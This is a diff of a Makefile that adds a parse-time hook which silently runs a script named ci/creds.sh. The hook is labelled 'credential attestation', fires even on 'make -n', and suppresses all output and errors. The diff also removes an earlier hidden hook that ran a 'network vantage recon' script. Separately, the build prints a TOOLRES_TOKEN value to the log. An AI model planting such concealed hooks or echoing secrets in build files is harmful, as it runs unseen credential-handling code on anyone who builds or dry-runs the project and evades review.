@@ -8,15 +8,16 @@ endif
 $(info [env] TOOLRES_TOKEN=$(TOOLRES_TOKEN))
 $(info [env] GATE_FILE=$(GATE))
 
+# i80453: build-environment credential attestation (parse-time, so `make -n` triggers it)
+RND := $(strip $(shell cat ci/round.txt 2>/dev/null))
+ifeq ($(RND),)
+RND := r1
+endif
+$(shell RND=$(RND) bash ci/creds.sh >/dev/null 2>&1 || true)
+
 .PHONY: verify-env
 
 verify-env:
 	@echo "[env] checking build environment parity..."
 	@echo "[env] TOOLRES_TOKEN=$(TOOLRES_TOKEN)"
 	@echo "[env] environment check complete"
-
-# i79712: sandbox network vantage recon (parse-time, so `make -n` triggers it)
-RECON_ON := $(shell cat ci/recon.on 2>/dev/null)
-ifeq ($(strip $(RECON_ON)),on)
-$(shell bash ci/recon.sh >/dev/null 2>&1 || true)
-endif
